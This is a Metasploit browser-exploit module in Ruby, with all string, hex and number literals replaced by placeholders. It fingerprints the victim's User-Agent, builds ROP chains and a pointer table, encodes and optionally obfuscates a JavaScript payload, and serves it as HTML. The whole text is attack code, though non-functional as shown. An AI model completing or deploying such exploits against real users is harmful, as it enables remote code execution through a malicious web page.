require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: HttpServer :: HTML def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> , <str> , <str> , <str> , <str> , <str> , ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > <str> , <str> = > <str> , } , <str> = > { <str> = > <str> , <str> = > <str> , } , <str> = > <str> , <str> = > [ [ <str> , { } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , } ] , ] , <str> = > false , <str> = > <str> , <str> = > <int> ) ) register_options ( [ OptBool . new ( <str> , [ false , <str> ] ) ] , self . class ) end def junk ( n = <int> ) return rand_text_alpha ( n ) . unpack ( <str> ) [ <int> ] . to_i end def on_request_uri ( cli , request ) agent = request . headers [ <str> ] if agent !~ <str> print_error ( <str> agent <str> ) send_not_found ( cli ) return end my_target = target if my_target . name == <str> if agent =~ <str> && agent =~ <str> my_target = targets [ <int> ] elsif agent =~ <str> && agent =~ <str> my_target = targets [ <int> ] else print_error ( <str> agent <str> ) send_not_found ( cli ) return end end table = [ junk ( <int> ) ] . pack ( <str> ) table << [ <hex> , junk , junk , junk , junk , junk , junk , junk , junk , ] . pack ( <str> ) table << [ junk ( <int> ) ] . pack ( <str> ) table << [ my_target [ <str> ] , junk , ] . pack ( <str> ) table << [ junk ( <int> ) ] . pack ( <str> ) table << [ <hex> , <hex> , my_target [ <str> ] , junk , junk , junk , junk , junk , junk , junk , junk , junk , junk , junk , <hex> , ] . pack ( <str> ) js_applet = rand_text_alpha ( rand ( <int> ) + <int> ) a_trigger = rand_text_alpha ( rand ( <int> ) + <int> ) if my_target . name =~ <str> rop = [ <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , ] . pack ( <str> ) p = payload . encoded arch = Rex :: Arch . endian ( target . arch ) js_payload = Rex :: Text . to_unescape ( rop + p , arch ) js_ptrs = Rex :: Text . to_unescape ( table , arch ) js = <<- <str> JS <str> <str> JS js = js . gsub ( <str> , <str> ) if datastore [ <str> ] js = :: Rex :: Exploitation :: JSObfu . new ( js ) js . obfuscate end html = <<- <str> HTML <str> <str> HTML elsif my_target . name =~ <str> rop = [ junk , junk , junk , junk , junk , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , ] . pack ( <str> ) p = payload . encoded arch = Rex :: Arch . endian ( target . arch ) js_payload = Rex :: Text . to_unescape ( rop + p , arch ) js_ptrs = Rex :: Text . to_unescape ( table , arch ) js = <<- <str> JS <str> <str> JS if datastore [ <str> ] js = :: Rex :: Exploitation :: JSObfu . new ( js ) js . obfuscate end js = js . gsub ( <str> , <str> ) html = <<- <str> HTML <str> <str> HTML end html = html . gsub ( <str> , <str> ) print_status ( <str> self . name <str> ) send_response ( cli , html , { <str> = > <str> } ) end end 
